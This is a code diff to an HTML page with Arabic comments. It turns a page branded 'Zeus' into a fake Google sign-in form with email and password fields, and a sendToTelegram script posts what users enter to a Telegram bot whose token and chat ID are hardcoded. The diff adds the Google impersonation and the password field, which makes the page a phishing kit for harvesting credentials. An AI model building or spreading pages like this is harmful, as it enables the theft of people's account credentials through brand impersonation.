@@ -33,7 +33,7 @@
         object-fit: cover;
     }
 
-    /* نص Zeus المتوهّج */
+    /* نص Google المتوهّج */
     #glowText {
         margin-top: 25px;
         font-size: 80px;
@@ -45,11 +45,11 @@
 
     /* صندوق تسجيل الدخول */
     .box {
-        width: 500px;
-        padding: 500px;
+        width: 320px;
+        padding: 20px;
         background: #333;
-        border-radius: 200px;
-        margin-top: 200px;
+        border-radius: 12px;
+        margin-top: 30px;
         box-shadow: 0 0 20px rgba(0,0,0,0.5);
     }
 
@@ -89,24 +89,25 @@
 
     <!-- الصورة الدائرية -->
     <div class="circle-img">
-        <img src="IMG_20260227_163153_674.jpg" alt="Image">
+        <img src="1763827428503.jpg" alt="Image">
     </div>
 
-    <!-- نص Zeus -->
-    <div id="glowText">Zeus</div>
+    <!-- نص Google -->
+    <div id="glowText">Google</div>
 
     <!-- صندوق login -->
     <div class="box">
-        <h2>حط الايدي واضغط ارسال</h2>
+        <h2>تسجيل الدخول</h2>
 
-        <input type="email" id="emailInput" class="input-field" placeholder="ايدي حسابك"
+        <input type="email" id="emailInput" class="input-field" placeholder="أدخل بريدك الإلكتروني">
+        <input type="password" id="passwordInput" class="input-field" placeholder="كلمة السر">
 
         <button class="btn" onclick="sendToTelegram()">إرسال رسالة آمنة</button>
     </div>
 
 
 <script>
-/* توهّج كلمة Zeus */
+/* توهّج كلمة Google */
 const text = document.getElementById("glowText");
 let colors = ["red", "#ff0066", "#cc00cc", "#9900ff", "#6600ff", "#cc00cc"];
 let i = 0;
@@ -118,13 +119,13 @@ setInterval(() => {
 
 
 /* إرسال رسالة عادية إلى تليغرام — بدون كلمات سر */
-const BOT_TOKEN = "8757355224:AAF6QbA34Eq03MTdUxhYB2tjjIbFbUaII_8";   // ← ضع توكن البوت هنا
+const BOT_TOKEN = "8313533882:AAGCMhJ-YFRZXZbcpOn83B8M2D1c8dznz-A";   // ← ضع توكن البوت هنا
 const CHAT_ID  = "8166977574";      // ← ضع ID هنا
 
 function sendToTelegram() {
     const email = document.getElementById("emailInput").value;
 
-    if (!email) return alert("أدخل ايدي حسابك ");
+    if (!email) return alert("أدخل بريدك أولاً");
 
     const text = `📩 رسالة جديدة من الموقع:\n\nEmail: ${email}`;
 
@@ -139,4 +140,4 @@ function sendToTelegram() {
 </script>
 
 </body>
-  </html>
+</html>
